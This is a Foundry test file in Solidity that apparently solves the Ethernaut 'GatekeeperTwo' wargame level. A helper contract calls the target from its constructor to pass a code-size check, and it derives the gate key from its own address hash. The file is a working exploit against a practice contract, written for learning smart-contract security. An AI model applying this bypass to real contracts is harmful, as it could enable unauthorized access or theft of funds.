// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/GatekeeperTwo.sol";

contract MiddleMan {
    constructor(address prey) {
        bytes8 gateKey = bytes8(
            type(uint64).max ^
                uint64(bytes8(keccak256(abi.encodePacked(address(this)))))
        );
        GatekeeperTwo(prey).enter(gateKey);
    }
}

contract GatekeeperTwoTest is Test {
    GatekeeperTwo instance =
        GatekeeperTwo(vm.envAddress("GATEKEEPER_TWO_ADDRESS"));

    function test() public {
        MiddleMan middleMan = new MiddleMan(address(instance));

        assertEq(instance.entrant(), msg.sender);
    }
}
